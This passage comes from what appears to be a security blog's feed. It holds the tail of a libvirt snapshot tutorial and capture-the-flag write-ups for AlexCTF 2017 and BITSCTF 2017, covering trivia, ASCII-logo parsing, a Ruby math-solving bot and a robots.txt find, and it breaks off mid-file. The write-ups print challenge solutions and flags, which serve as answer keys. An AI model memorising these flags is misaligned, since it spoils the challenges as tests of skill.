<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-create vmname /path/to/description.xml</div></pre></td></tr></table></figure></p>
<p>Or make a snapshot without description file:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-create vmname</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: this is much more faster to make a snapshot while the VM is stoped. But it's also possible to make a snapshot while the VM is running even if it's more slow.</p>
<p>If you want to see some informations about the VM and snapshots you can run:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ qemu-img info /path/to/disk/image/vmname.qcow2</div><div class="line">image: vmname.qcow2</div><div class="line">file format: qcow2</div><div class="line">virtual size: 20G (21474836480 bytes)</div><div class="line">disk size: 5.2G</div><div class="line">cluster_size: 65536</div><div class="line">Snapshot list:</div><div class="line">ID        TAG                 VM SIZE                DATE       VM CLOCK</div><div class="line">1         vmname-snapshot1   329M 2017-02-08 20:40:59   01:23:38.281</div><div class="line">2         vmname-snapshot2   375M 2017-02-08 20:46:39   01:26:01.645</div><div class="line">3         vmname-snapshot3   482M 2017-02-08 22:42:48   03:22:00.515</div><div class="line">Format specific information:</div><div class="line">    compat: 1.1</div><div class="line">    lazy refcounts: true</div><div class="line">    refcount bits: 16</div><div class="line">    corrupt: false</div></pre></td></tr></table></figure></p>
<p>To revert the VM to a snapshot, for example run:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ virsh snapshot-revert vmname vmname-snapshot1</div></pre></td></tr></table></figure></p>
<p><a href="https://kashyapc.com/2011/10/04/snapshotting-with-libvirt-for-qcow2-images/" target="_blank" rel="external">Source</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Libvirt_support.svg/640px-Libvirt_support.svg.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="system" scheme="http://rawsec.ml/tags/system/"/>
    
      <category term="virtualization" scheme="http://rawsec.ml/tags/virtualization/"/>
    
  </entry>
  
  <entry>
    <title>AlexCTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/AlexCTF-2017-write-ups/"/>
    <id>http://rawsec.ml/en/AlexCTF-2017-write-ups/</id>
    <published>2017-02-04T23:00:00.000Z</published>
    <updated>2017-02-07T21:03:11.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : AlexCTF 2017</li>
<li><strong>Website</strong> : <a href="https://ctf.oddcoder.com/" target="_blank" rel="external">ctf.oddcoder.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/408/" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="10-tr1-hello-there-trivia">10 - TR1: Hello there - Trivia</h2>
<blockquote>
<p>Why not drop us a few lines and say hi :).</p>
</blockquote>
<p>Go to the irc: <code>#alexctf @freenode</code> and get the flag with <code>/topic</code>.</p>
<h2 id="20-tr2-ssl-0day-trivia">20 - TR2: SSL 0day - Trivia</h2>
<blockquote>
<p>It lead to memory leakage between servers and clients rending large number of private keys accessible. (one word)</p>
</blockquote>
<p>Answer: <strong>heartbleed</strong> (<a href="http://heartbleed.com/" target="_blank" rel="external">details</a>)</p>
<h2 id="30-tr3-ca-trivia">30 - TR3: CA - Trivia</h2>
<blockquote>
<p>What is the CA that issued Alexctf https certificate</p>
<p>(flag is lowercase with no spaces)</p>
</blockquote>
<p>Answer: <strong>letsencrypt</strong></p>
<h2 id="40-tr4-doesn-t-our-logo-look-cool-trivia">40 - TR4: Doesn't our logo look cool ? - Trivia</h2>
<p>Here is the logo:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&apos;@+.                                                                                          </div><div class="line">@@@@@@@:                                                                                        </div><div class="line">@@@@@@@@@#                                                                                       </div><div class="line">@@@@@@@@@@@,                                                                                      </div><div class="line">&apos;@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@.                                                                                     </div><div class="line">@@@@@@@@@@@@@,                                                                                     </div><div class="line">@@@@A@@@@@@@@                                                                                      </div><div class="line">+@@@@@@@@@@@@                       .:++@@@@@+:.                                                   </div><div class="line">@@@@@@@@@@@&apos;                .+@@@@@@@@@@@@@@@@@@@@@`                                              </div><div class="line">.@@@@@@@@@@            .#@@@@@@@@@@@@@@L@@@@@@@@@@@@@#                                            </div><div class="line">+@@@@@@@@         `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                   .@@.   </div><div class="line">+@@@E@@@@      .@@@@@@X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                              &apos;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@C@@.                       `+@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@T@@@@@@@@@@@&apos;,`       .+@@@@@@@@@@@@@@@:              `:@@@@@@F@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@+.                    ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@,                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                               +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                   ;@@@@@@@@@@@@&#123;@@@@@@@@@@@#,   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                       &apos;@@@@@@@@@@@@@@+,         ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                        :;.                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    @     ;@       @@@@@@@  @`   `@   +@@#@@  &apos;@@@@@@@  @@@@@@@, ;@@@0@.   </div><div class="line">+@@@@U@@@      ;@@@@@.    @+    ;@       @        .@   @,   @    #@    `@     @        ;@@@@@.   </div><div class="line">+@@@@@R@@      ;@@@@@.   .@@    ;@       @         @` `@   :@     @    `@     @        ;@@@_@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @,@    ;@       @         ,@ @,   ;@     `    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ @:   ;@       @          @`@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ .@   ;@       @          ,@:    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  +#  @   ;@       @@@@@@      @     ;@          `@     @@@@@@   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   @`  ;@       @          @+@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   &apos;#  ;@       @          @ @    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. ,@@@@@@  ;@       @         @; :@   ;@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @:    @  ;@       @         @   @   ,@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @     @; ;@       @        @;   :@   @,   @&apos;    `@     @        ;@@@@@.   </div><div class="line">+@@@@@L@@      ;@@@@@. @     .@ ;@@@@@@  @@@@@@@  @     @    @@@@#     `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@0@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@G@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.             ..,:,..                                             ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    `&apos;@@@@@@@@@@@@@@@@@@@@:                                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.+@@@@@@@@@@@@@0@@@@@@@@@@@@@@@.                                  ;@@@_@.   </div><div class="line">+@@R@@@@@      ;@@@@0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                                ;@@C@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`                            .@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@K@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                    `&apos;@@@@@S@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@+;;...;;+@@@@@@@@@@@@@@@@@@@@@@+:.    ..:+@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@#,                    &apos;@@@@@&#125;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@;                            ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@#                                  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#      </div><div class="line">+@@@@@@@@      ,                                        ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.         </div><div class="line">+@@@@@@@@                                                  `+@@@@@@@@@@@@@@@@@@@@#,              </div><div class="line">+@@@@@@@@                                                         .;&apos;+++&apos;;.                      </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+++++++++++++++++++#@@@@@@@@+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</div></pre></td></tr></table></figure></p>
<p>Let's write a very short ruby script to filter that:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">logo = open(<span class="string">"logo.txt"</span>, <span class="string">'r'</span>).read()</div><div class="line"><span class="comment">#flag = logo.gsub(/[^a-zA-Z0-9&#123;&#125;_]/, '')</span></div><div class="line">flag = logo.gsub(<span class="regexp">/[#@.;:+,`'\s]/</span>, <span class="string">''</span>)</div><div class="line">puts flag</div></pre></td></tr></table></figure></p>
<p>Flag: <code>ALEXCTF{0UR_L0G0_R0CKS}</code></p>
<h2 id="100-sc1-math-bot-scripting">100 - SC1: Math bot - Scripting</h2>
<blockquote>
<p>It is well known that computers can do tedious math faster than human.</p>
<p>nc 195.154.53.62 1337</p>
<p>Update</p>
<p>we got another mirror here</p>
<p>nc 195.154.53.62 7331</p>
</blockquote>
<p>The server send some calculations with big integers and we have to solve a lot of them.</p>
<p>To do that I did a ruby bot:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'195.154.53.62'</span></div><div class="line">port = <span class="number">1337</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line"></div><div class="line">raw = <span class="string">''</span></div><div class="line">res = <span class="literal">nil</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/=$/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        calc = raw.match(<span class="regexp">/^([0-9]*) ([+\-%*\/]) ([0-9]*) =/</span>)</div><div class="line">        a = calc.captures[<span class="number">0</span>].to_i</div><div class="line">        oper = calc.captures[<span class="number">1</span>]</div><div class="line">        b = calc.captures[<span class="number">2</span>].to_i</div><div class="line">        <span class="keyword">if</span> oper == <span class="string">'+'</span></div><div class="line">            res = a + b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'-'</span></div><div class="line">            res = a - b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'*'</span></div><div class="line">            res = a * b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'%'</span></div><div class="line">            res = a % b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'/'</span></div><div class="line">            res = a / b</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"That's not good..."</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">if</span> res != <span class="literal">nil</span></div><div class="line">            puts res</div><div class="line">            s.puts res</div><div class="line">        <span class="keyword">end</span></div><div class="line">        res = <span class="literal">nil</span></div><div class="line">        raw = <span class="string">''</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
<p><em>Note</em>: I chose not to use some exec function because I don't trust external entries.</p>
<p>Here an example of output and the flag:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">                __________</div><div class="line">         ______/ ________ \______</div><div class="line">       _/      ____________      \_</div><div class="line">     _/____________    ____________\_</div><div class="line">    /  ___________ \  / ___________  \</div><div class="line">   /  /XXXXXXXXXXX\ \/ /XXXXXXXXXXX\  \</div><div class="line">  /  /############/    \############\  \</div><div class="line">  |  \XXXXXXXXXXX/ _  _ \XXXXXXXXXXX/  |</div><div class="line">__|\_____   ___   //  \\   ___   _____/|__</div><div class="line">[_       \     \  X    X  /     /       _]</div><div class="line">__|     \ \                    / /     |__</div><div class="line">[____  \ \ \   ____________   / / /  ____]</div><div class="line">     \  \ \ \/||.||.||.||.||\/ / /  /</div><div class="line">      \_ \ \  ||.||.||.||.||  / / _/</div><div class="line">        \ \   ||.||.||.||.||   / /</div><div class="line">         \_   ||_||_||_||_||   _/</div><div class="line">           \     ........     /</div><div class="line">            \________________/</div><div class="line"></div><div class="line">Our system system has detected human traffic from your IP!</div><div class="line">Please prove you are a bot</div><div class="line">Question  1 :</div><div class="line">188284398378183198274310077338361 - 222311858895894501436877647952618 =</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">Question  250 :</div><div class="line">198932319558549559940672382195244 % 276981013309967153730940955239195 =</div><div class="line">Well no human got time to solve 500 ridiculous math challenges</div><div class="line">Congrats MR bot!</div><div class="line">Tell your human operator flag is: ALEXCTF&#123;1_4M_l33t_b0t&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>BITSCTF 2017 - Write-ups</title>
    <link href="http://rawsec.ml/en/BITSCTF-2017-writeups/"/>
    <id>http://rawsec.ml/en/BITSCTF-2017-writeups/</id>
    <published>2017-02-04T23:00:00.000Z</published>
    <updated>2017-02-07T18:23:36.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : BITSCTF 2017</li>
<li><strong>Website</strong> : <a href="https://bitsctf.bits-quark.org/" target="_blank" rel="external">bitsctf.bits-quark.org</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/417" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="10-botbot-web">10 - BotBot - web</h2>
<blockquote>
<p>Should not ask for the description of a 5 marker.</p>
<p><a href="http://botbot.bitsctf.bits-quark.org" target="_blank" rel="external">botbot.bitsctf.bits-quark.org</a></p>
</blockquote>
<p>Let's look at the source code:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">	Nothing to see here. Maybe try looking up seo .txt</div><div class="line">--&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>Now go to <code>http://botbot.bitsctf.bits-quark.org/robots.txt</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Useragent *</div><div class="line">Disallow: /fl4g</div></pre></td></tr></table></figure></p>
<p><a href="http://botbot.bitsctf.bits-quark.org/fl4g/" target="_blank" rel="external">http://botbot.bitsctf.bits-quark.org/fl4g/</a> :</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BITCTF&#123;take_a_look_at_googles_robots_txt&#125;</div></pre></td></tr></table></figure></p>
<h2 id="20-labour-misc">20 - Labour - Misc</h2>
<blockquote>
<p>Follow your heart, for it leads you straight to the answer.</p>
</blockquote>
<p>It's a gpx file:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;</div><div class="line">&lt;gpx version=&quot;1.1&quot; creator=&quot;BITSCTF&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://www.topografix.com/GPX/1/1&quot; xsi:schemaLocation=&quot;http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd&quot;&gt;</div><div class="line"></div><div class="line">&lt;!--Use appropriate brackets and underscores to separate words if you succeed--&gt;</div><div class="line">&lt;wpt 